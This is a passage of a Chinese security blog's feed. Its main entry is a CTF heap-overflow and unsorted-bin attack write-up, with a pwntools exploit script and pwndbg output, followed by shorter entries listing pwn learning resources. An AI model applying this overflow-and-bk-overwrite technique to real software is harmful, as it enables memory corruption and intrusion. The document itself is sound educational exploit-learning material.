color=\"red\">如果我们申请的chunk大小比这个小,那么就存在了溢</font>出,如果编辑的地址不存在,会重新进行malloc地址,大小为0x3A0</p>\n<p>​\t\t也就是说,如果我们一开始申请一个小的chunk,它后面接一个0x3A0大小的chunk,然后把0x3A0大小的chunk free掉,然后通过溢出,把这个free掉之后的chunk的值修改成我们想要的(<font color=\"red\">把bk改成想修改的地址</font>),然后再重新编辑一下,重新malloc的时候就会又申请到这个free 的chunk(也就是unsorted bin),然后就会触发漏洞</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( *(&amp;ptr + (<span class=\"type\">int</span>)v2) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, *(&amp;ptr + (<span class=\"type\">int</span>)v2), <span class=\"number\">0x4F0</span>uLL);</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v0 = v2;</span><br><span class=\"line\">      *(&amp;ptr + v0) = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x3A0</span>uLL);</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, *(&amp;ptr + (<span class=\"type\">int</span>)v2), <span class=\"number\">0x3A0</span>uLL);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t</p>\n<h2 id=\"构造攻击链\"><a href=\"#构造攻击链\" class=\"headerlink\" title=\"构造攻击链\"></a>构造攻击链</h2><p>​\t\t释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</p>\n<p>​\t\t什么是不属于fast bin的呢??</p>\n<p>​\t\t那我们就第一个值随意,第二个值构造小一点,比如0x20,第三个值构造成0x3A0,然后后面随意,然后删除第三个值,修改第二个值,覆盖掉它,然后再edit第三个值,进行重新申请,触发漏洞获取flag.</p>\n<p>​\t\t这里注意之前所说的,我们给的大小,它实际上会+0x90,所以要申请一个0x3A0 - 0x90 &#x3D; 0x310 也就是784大小的值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x603000</span><br><span class=\"line\">Size: 0xb1</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x6030b0</span><br><span class=\"line\">Size: 0xc1</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x603170</span><br><span class=\"line\">Size: 0x3b1</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x603520</span><br><span class=\"line\">Size: 0xb1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t0xc1 193     144 + 32 &#x3D; 176    多了17,  这个多的16字节是prev_size + size + NMP, 那为什么还多了一字节 因为对齐,在64位平台下,chunk大小一定是0x10的整数倍,那为什么都多了1呢?这里其实不是多了1,是显示的问题,size的话,是前5字节,也就是11000也就是16 + 4 &#x3D; 20, 然后最后的1是指的P为1,也就是前一个chunk被使用的意思,0是未被使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/bt 0x6030b8</span><br><span class=\"line\">0x6030b8:\t11000001</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-10-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8F%8Aunsorted-bin%E6%94%BB%E5%87%BB/image-20230303143001538.png\" alt=\"image-20230303143001538\"></p>\n<p>​\t\t0xb1 177     144 + 12 &#x3D; 156    多了21,</p>\n<p>​\t\t0x3b1  945  144 + 784 &#x3D; 928 多了17</p>\n<p>​\t\tpayload的构造的话,就是填满第2个chunk,然后溢出,填满prev_size,然后修改size为正确值,然后加上bk(要修改的地址)就可以了</p>\n<p>​\t\tpayload &#x3D; (0x90 + 0x20) * b”a” + p64(0) + p64(0x3a0+0x1) + p64(0x6020D4)</p>\n<p>p64是个啥,8byte, 8字节,64位, 指令一行又是多少..有点晕</p>\n<p>p64就是64位机器的编码,把0编码成0x00\t0x00\t0x00\t0x00\t0x00\t0x00\t0x00\t0x00,占64位,也就是8个字节</p>\n<p>这个64位,32位指的是一次处理数据的宽度,和指令长度以及他们的地址没关系</p>\n<p>指令的话,占多少字节都是可能的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class=\"line\">00:0000│ r13 rsp 0x7fffffffe560 ◂— 0x1</span><br><span class=\"line\">01:0008│         0x7fffffffe568 —▸ 0x7fffffffe7b7 ◂— &#x27;/home/ubuntu/2yue/ezfmt&#x27;</span><br><span class=\"line\">02:0010│         0x7fffffffe570 ◂— 0x0</span><br><span class=\"line\">03:0018│         0x7fffffffe578 —▸ 0x7fffffffe7cf ◂— 0x524f4c4f435f534c (&#x27;LS_COLOR&#x27;)</span><br><span class=\"line\">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class=\"line\"> ► f 0         0x4006e0</span><br><span class=\"line\">────────────────────────────────────────────────────────────────────────────────</span><br><span class=\"line\">pwndbg&gt; x/8bx 0x7fffffffe560</span><br><span class=\"line\">0x7fffffffe560:\t0x01\t0x00\t0x00\t0x00\t0x00\t0x00\t0x00\t0x00</span><br><span class=\"line\">pwndbg&gt; x/8bx 0x7fffffffe568</span><br><span class=\"line\">0x7fffffffe568:\t0xb7\t0xe7\t0xff\t0xff\t0xff\t0x7f\t0x00\t0x00</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">.text:0000000000400BE3</span><br><span class=\"line\">.text:0000000000400BE3                 push    rbp</span><br><span class=\"line\">.text:0000000000400BE4                 mov     rbp, rsp</span><br><span class=\"line\">.text:0000000000400BE7                 sub     rsp, 10h</span><br><span class=\"line\">.text:0000000000400BEB                 mov     eax, 0</span><br><span class=\"line\">.text:0000000000400BF0                 call    sub_4008F6</span><br><span class=\"line\">.text:0000000000400BF5                 mov     edi, offset aWelcomeTo997We ; &quot;Welcome to 997 wellfare! This program r&quot;...</span><br><span class=\"line\">.text:0000000000400BFA                 call    _puts</span><br><span class=\"line\">.text:0000000000400BFF                 mov     [rbp+var_8], 0</span><br><span class=\"line\">.text:0000000000400C06                 mov     [rbp+var_4], 0</span><br><span class=\"line\">.text:0000000000400C0D                 jmp     short loc_400C37</span><br><span class=\"line\">.text:0000000000400C0F ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:0000000000400C0F</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t所以 x&#x2F;20wx 0xxxxxxxxxxxx 显示的一行其实是16字节, 128位, 所以左边的地址加了16,</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/20wx 0x6030b0</span><br><span class=\"line\">0x6030b0:\t0x00000000\t0x00000000\t0x000000b1\t0x00000000</span><br><span class=\"line\">0x6030c0:\t0x000a3231\t0x00000000\t0x00000000\t0x00000000</span><br><span class=\"line\">0x6030d0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000</span><br><span class=\"line\">0x6030e0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">def add(length,context):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;note:&quot;</span>,length)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;record:&quot;</span>,context)</span><br><span class=\"line\"></span><br><span class=\"line\">def delete(num):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;exit&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;delete:&quot;</span>,num)</span><br><span class=\"line\"></span><br><span class=\"line\">def edit(num,context):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;exit&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;edit:&quot;</span>,num)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;content:&quot;</span>,context)</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./oork_note&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x7ffff7af2031&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;32&quot;</span>,b<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;32&quot;</span>,b<span class=\"string\">&quot;aaaa&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;784&quot;</span>,b<span class=\"string\">&quot;aaaaa&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;32&quot;</span>,b<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;32&quot;</span>,b<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;32&quot;</span>,b<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">&quot;32&quot;</span>,b<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;note? y/n&quot;</span>,<span class=\"string\">&quot;y&quot;</span>)</span><br><span class=\"line\">delete(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">#payload = (0x90 + 0x20) * b<span class=\"string\">&quot;a&quot;</span> + p64(0) + p64(0x3a0+0x1) + p64(0x6020D4)</span></span><br><span class=\"line\"><span class=\"meta\">#payload = (0x90 + 0x20) * b<span class=\"string\">&quot;a&quot;</span> + p64(0) + p64(0x3a0+0x1 + 0x10) +p64(0)+ p64(0x6020D4 - 0x10)</span></span><br><span class=\"line\">addr = <span class=\"number\">0x06020D4</span> - <span class=\"number\">0x10</span></span><br><span class=\"line\">payload = b<span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">176</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x3a1</span> + <span class=\"number\">0x10</span>) + p64(<span class=\"number\">0</span>) + p64(addr)</span><br><span class=\"line\">edit(<span class=\"string\">&quot;1&quot;</span>,payload)</span><br><span class=\"line\">edit(<span class=\"string\">&quot;2&quot;</span>,b<span class=\"string\">&quot;aaaa&quot;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">print(io.recv(<span class=\"number\">1024</span>))</span><br><span class=\"line\"><span class=\"meta\">#io.sendline(<span class=\"string\">&quot;0&quot;</span>)</span></span><br><span class=\"line\"><span class=\"meta\">#print(io.recv(1024))</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t你得理清楚哪里需要用b哪里不需要</p>\n<p>和libc版本有关吗?  感觉应该没问题了的,但是打不了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x6033d0</span>:       <span class=\"number\">0x00000000</span>      <span class=\"number\">0x00000000</span>      <span class=\"number\">0x000003b1</span>      <span class=\"number\">0x000</span></span><br><span class=\"line\">\\n<span class=\"number\">&#x27;</span>       │<span class=\"number\">00000</span></span><br><span class=\"line\">[*] Paused│<span class=\"number\">0x6033e0</span>:       <span class=\"number\">0x61616161</span>      <span class=\"number\">0x0000000a</span>      <span class=\"number\">0x00000000</span>      <span class=\"number\">0x000</span></span><br><span class=\"line\"> (press an│<span class=\"number\">00000</span></span><br><span class=\"line\">y to conti│<span class=\"number\">0x6033f0</span>:       <span class=\"number\">0x0000000a</span>      <span class=\"number\">0x00000000</span>      <span class=\"number\">0x00000000</span>      <span class=\"number\">0x000</span></span><br><span class=\"line\">nue)      │<span class=\"number\">00000</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">   <span class=\"number\">0x400bb8</span>    call   <span class=\"number\">0x400a14</span>                      &lt;<span class=\"number\">0x400a14</span>&gt; input the note index to edit</span><br><span class=\"line\">  sh.sendline(<span class=\"string\">&quot;1&quot;</span>)                   │</span><br><span class=\"line\">[DEBUG] Sent <span class=\"number\">0x2</span> bytes:              │ ► <span class=\"number\">0x400bbd</span>    jmp    <span class=\"number\">0x400bca</span>                      &lt;<span class=\"number\">0x400bca</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t看了一下申请的chunk大小不正常,怀疑是发送过去的数据有问题,恩,sendline有问题</p>\n<p>mov    rax, qword ptr fs:[0x28]  这个是canary吧</p>\n<p><a href=\"https://blog.csdn.net/counsellor/article/details/81005101\">https://blog.csdn.net/counsellor/article/details/81005101</a></p>\n<p>addr &#x3D; 0x06020D4 - 0x10 为啥要-0x10呢??         因为是要得到chunk的头吧,不是数据头</p>\n<p>怎么负数了… addr &#x3D; 0x06020D4 - 0x12 多减点值,让它覆盖的时候能覆盖上就可以了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-10-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8F%8Aunsorted-bin%E6%94%BB%E5%87%BB/image-20230601102322660.png\" alt=\"image-20230601102322660\"></p>\n<h2 id=\"gdb-pwntools调试\"><a href=\"#gdb-pwntools调试\" class=\"headerlink\" title=\"gdb + pwntools调试\"></a>gdb + pwntools调试</h2>",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/",
            "title": "pwn入门-遇到的奇奇怪怪的问题及解决办法",
            "date_published": "2023-02-19T03:17:23.000Z",
            "content_html": "<p>gcc -Wl,-rpath&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;&#x2F;,–dynamic-linker&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;ld-linux-x86-64.so.2 1.c</p>\n<p>&#x3D;&gt; 0x563e8cd58c31 &lt;main+395&gt;:\tlea    rdi,[rip+0xbd5]        # 0x563e8cd5980d</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/image-20230319232227418.png\" alt=\"image-20230319232227418\"></p>\n",
            "tags": []
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-0-%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90%E5%8F%8A%E5%A4%87%E5%BF%98%E4%BB%93%E5%BA%93/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-0-%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90%E5%8F%8A%E5%A4%87%E5%BF%98%E4%BB%93%E5%BA%93/",
            "title": "pwn入门-0-学习资源及备忘仓库",
            "date_published": "2023-02-18T11:36:51.000Z",
            "content_html": "<p>[toc]</p>\n<h1 id=\"每日可看\"><a href=\"#每日可看\" class=\"headerlink\" title=\"每日可看\"></a>每日可看</h1><p>玄武实验室  sec.today</p>\n<p>安全研究 GoSSIP 公众号每日推送</p>\n<p>吾爱破解 <a href=\"https://www.52pojie.cn/\">https://www.52pojie.cn</a></p>\n<p>看雪论坛 <a href=\"https://bbs.kanxue.com/\">https://bbs.kanxue.com</a></p>\n<p>v2ex 分享探索 社区 <a href=\"https://www.v2ex.com/\">https://www.v2ex.com</a></p>\n<h1 id=\"资源整合和学习路径\"><a href=\"#资源整合和学习路径\" class=\"headerlink\" title=\"资源整合和学习路径\"></a>资源整合和学习路径</h1><p><a href=\"https://csdiy.wiki/\">https://csdiy.wiki/</a> 北大学生总结的自学指南,非常好,融合了许多优质的公开课程和书籍</p>\n<h1 id=\"最近待看\"><a href=\"#最近待看\" class=\"headerlink\" title=\"最近待看\"></a>最近待看</h1><p><a href=\"https://github.com/firmianay/CTF-All-In-One/tree/master\">https://github.com/firmianay/CTF-All-In-One/tree/master</a> 感觉作者有添加一些新的东西(相比那本书)</p>\n<p><a href=\"https://seedsecuritylabs.org/instructor_manual.html\">https://seedsecuritylabs.org/instructor_manual.html</a> seedlab</p>\n<p><a href=\"https://nju-projectn.github.io/ics-pa-gitbook/ics2021/\">https://nju-projectn.github.io/ics-pa-gitbook/ics2021/</a> 南大计算机基础实验</p>\n<p><a href=\"http://www.hackdig.com/\">http://www.hackdig.com</a></p>\n<p><a href=\"https://www.bookstack.cn/read/webxiaohua-gitbook/README.md\">https://www.bookstack.cn/read/webxiaohua-gitbook/README.md</a></p>\n<p><a href=\"https://hacklido.com/\">https://hacklido.com/</a> 一个国外的网站, 有篇很励志的文章<a href=\"https://hacklido.com/blog/439-how-i-got-my-oscp-at-16-years-old\">https://hacklido.com/blog/439-how-i-got-my-oscp-at-16-years-old</a></p>\n<p><a href=\"https://hsqstephenzhang.github.io/2022/02/10/linux/syscall/vdso/\">https://hsqstephenzhang.github.io/2022/02/10/linux/syscall/vdso/</a>  腾讯云容器团队的一个老哥的博客,感觉挺有意思</p>\n<p>北理工那个团队网站 <a href=\"https://www.isclab.org.cn/\">https://www.isclab.org.cn</a></p>\n<p><a href=\"https://www.ooopn.com/\">https://www.ooopn.com</a> 一个工具网站</p>\n<p><a href=\"https://bbs.kanxue.com/thread-218617.htm\">https://bbs.kanxue.com/thread-218617.htm</a> 看雪 个人博客</p>\n<p><a href=\"https://hnusec.github.io/#/Stuff\">https://hnusec.github.io/#/Stuff</a></p>\n<p>国际知名战队的博客等</p>\n<p><a href=\"https://defcon.org/html/defcon-29/dc-29-speakers.html#fournier\">https://defcon.org/html/defcon-29/dc-29-speakers.html#fournier</a></p>\n<p><a href=\"https://blog.csdn.net/Breeze_CAT/article/details/103788631\">https://blog.csdn.net/Breeze_CAT/article/details/103788631</a></p>\n<p><a href=\"https://wizardforcel.gitbooks.io/100-gdb-tips/content/call-func.html\">https://wizardforcel.gitbooks.io/100-gdb-tips/content/call-func.html</a></p>\n<p><a href=\"https://www.52pojie.cn/thread-1399142-1-1.html\">https://www.52pojie.cn/thread-1399142-1-1.html</a></p>\n<p><a href=\"https://hack1s.fun/page/2/\">https://hack1s.fun/page/2/</a></p>\n<p><a href=\"http://javabin.cn/\">http://javabin.cn</a> 一个搞物联网的,感觉挺有意思</p>\n<h1 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h1><p>libc.so.6怎么用?</p>\n<p><a href=\"https://www.cnblogs.com/Taolaw/p/16281185.html\">https://www.cnblogs.com/Taolaw/p/16281185.html</a></p>\n<p>Glibc,libc gcc工作原理了解清楚</p>\n<h1 id=\"学习资源\"><a href=\"#学习资源\" class=\"headerlink\" title=\"学习资源\"></a>学习资源</h1><h2 id=\"安全会议\"><a href=\"#安全会议\" class=\"headerlink\" title=\"安全会议\"></a>安全会议</h2><p>四大顶会</p>\n<p>blackhat <a href=\"https://www.blackhat.com/\">https://www.blackhat.com</a></p>\n<p><a href=\"https://www.blackhat.com/latestintel/\">https://www.blackhat.com/latestintel/</a></p>\n<p><a href=\"https://www.blackhat.com/html/archives.html\">https://www.blackhat.com/html/archives.html</a></p>\n<h2 id=\"安全社区-可以没事多逛逛\"><a href=\"#安全社区-可以没事多逛逛\" class=\"headerlink\" title=\"安全社区(可以没事多逛逛)\"></a>安全社区(可以没事多逛逛)</h2><p>玄武实验室  sec.today</p>\n<p>吾爱破解 <a href=\"https://www.52pojie.cn/\">https://www.52pojie.cn</a></p>\n<p>看雪论坛 <a href=\"https://bbs.kanxue.com/\">https://bbs.kanxue.com</a></p>\n<p>v2ex 分享探索 社区 <a href=\"https://www.v2ex.com/\">https://www.v2ex.com</a></p>\n<p><a href=\"https://www.ctfiot.com/\">https://www.ctfiot.com</a>  chamd5的! 一个综合信息平台</p>\n<h2 id=\"学习网站\"><a href=\"#学习网站\" class=\"headerlink\" title=\"学习网站\"></a>学习网站</h2><p>CTFwiki（入门必看wiki）: <a href=\"https://ctf-wiki.github.io/ctf-wiki/#/introduction\">https://ctf-wiki.github.io/ctf-wiki/#/introduction</a></p>\n<p>ctftime     ctf各个比赛日程,很权威</p>\n<p>buuctf   <a href=\"https://buuoj.cn/\">https://buuoj.cn/</a></p>\n<p>ctfshow <a href=\"https://ctf.show/challenges\">https://ctf.show/challenges</a></p>\n<p>ctfhub</p>\n<p>CTFrank: <a href=\"https://ctfrank.org/\">https://ctfrank.org/</a></p>\n<p>攻防世界  xctf官方: <a href=\"https://time.xctf.org.cn/\">https://time.xctf.org.cn</a></p>\n<p>i春秋   <a href=\"https://www.ichunqiu.com/competition\">https://www.ichunqiu.com/competition</a></p>\n<p><a href=\"http://www.wechall.net/active_sites\">http://www.wechall.net/active_sites</a>  一个ctf网站，同时也收录了很多学习网站</p>\n<p>Tryhackme\\hackthebox\\</p>\n<h3 id=\"pwn专属\"><a href=\"#pwn专属\" class=\"headerlink\" title=\"pwn专属\"></a>pwn专属</h3><p>pwn.college   由浅入深,一步一步,还有机器可以用!</p>\n<p><a href=\"https://pwnable.kr/\">https://pwnable.kr</a>            </p>\n<p><a href=\"http://pwnable.tw/\">http://pwnable.tw</a>            </p>\n<h2 id=\"重要比赛\"><a href=\"#重要比赛\" class=\"headerlink\" title=\"重要比赛\"></a>重要比赛</h2><p>defcon <a href=\"https://defcon.org/html/defcon-30/dc-30-training.html\">https://defcon.org/html/defcon-30/dc-30-training.html</a></p>\n<h2 id=\"书籍\"><a href=\"#书籍\" class=\"headerlink\" title=\"书籍\"></a>书籍</h2><p>《计算机安全导论：深度实践 (杜文亮) 》 很适合入门,讲的非常详细</p>\n<p>《从0到1，CTFer的成长之路》</p>\n<p>《CTF权威指南-PWN篇》</p>\n<h2 id=\"大佬博客\"><a href=\"#大佬博客\" class=\"headerlink\" title=\"大佬博客\"></a>大佬博客</h2><p><a href=\"https://xuanxuanblingbling.github.io/\">https://xuanxuanblingbling.github.io</a>       xuanxuan和他对象的,记录了从小白到大神的一路,感觉写得非常好!</p>\n<p><a href=\"https://blingblingxuanxuan.github.io/\">https://blingblingxuanxuan.github.io</a></p>\n<p><a href=\"https://hurricane618.me/\">https://hurricane618.me</a> IIE学长的博客,有写自己的心路历程,感觉很不错,能从中看到一个人的成长 </p>\n<p><a href=\"https://kiprey.github.io/\">https://kiprey.github.io</a>       清华网安硕士在读,博客深入浅出,良好的学习路线</p>\n<p><a href=\"https://blog.csdn.net/weixin_45209963?type=blog\">https://blog.csdn.net/weixin_45209963?type=blog</a> 天大pwn老哥的博客</p>\n<p>计算机底层的秘密 <a href=\"https://github.com/webxiaohua/gitbook/blob/master/SUMMARY.md\">https://github.com/webxiaohua/gitbook/blob/master/SUMMARY.md</a> 这个合集不错</p>\n<p><a href=\"http://ifsec.blogspot.com/2018/02/so-you-want-to-work-in-security-and-for.html\">http://ifsec.blogspot.com/2018/02/so-you-want-to-work-in-security-and-for.html</a></p>\n<p><a href=\"https://bestwing.me/archives/page/14/\">https://bestwing.me/archives/page/14/</a></p>\n<p><a href=\"https://etenal.me/archives/1121\">https://etenal.me/archives/1121</a> 待看,这个也不错,这一篇是堆的</p>\n<p><a href=\"http://blog.imv1.me/\">http://blog.imv1.me</a>  NeSE搞内核安全的大佬学长</p>\n<p><a href=\"https://eqqie.cn/\">https://eqqie.cn</a></p>\n<p><a href=\"https://github.com/kiprey/skr_Learning\">https://github.com/kiprey/skr_Learning</a> 一个非常不错的成长路线(每周更新),可以参考,</p>\n<p><a href=\"https://cjting.me/\">https://cjting.me</a>  做的一些很深入的小研究,治愈系</p>\n<p><a href=\"https://trailofbits.github.io/ctf/\">https://trailofbits.github.io/ctf/</a></p>\n<p><a href=\"https://link.zhihu.com/?target=https://security.ntu.st/\">https://security.ntu.st/</a></p>\n<p><a href=\"https://github.com/BrieflyX/ctf-pwns\">https://github.com/BrieflyX/ctf-pwns</a> </p>\n<p>Atum</p>\n<p><a href=\"https://hpdoger.cn/about/\">https://hpdoger.cn/about/</a> 又一个学长的博客</p>\n<p><a href=\"https://trailofbits.github.io/ctf/\">https://trailofbits.github.io/ctf/</a></p>\n<p><a href=\"https://link.zhihu.com/?target=https://security.ntu.st/\">https://security.ntu.st/</a></p>\n<p><a href=\"https://etenal.me/archives/972#C1\">https://etenal.me/archives/972#C1</a></p>\n<p><a href=\"https://github.com/BrieflyX/ctf-pwns\">https://github.com/BrieflyX/ctf-pwns</a></p>\n<p><a href=\"https://y4er.com/\">https://y4er.com</a> web</p>\n<ul>\n<li><a href=\"https://blog.flanker017.me/\">https://blog.flanker017.me</a></li>\n<li>Eastmount（csdn）、娜璋ai安全之家（公众号）：博士在读，研究AI、网络安全   <a 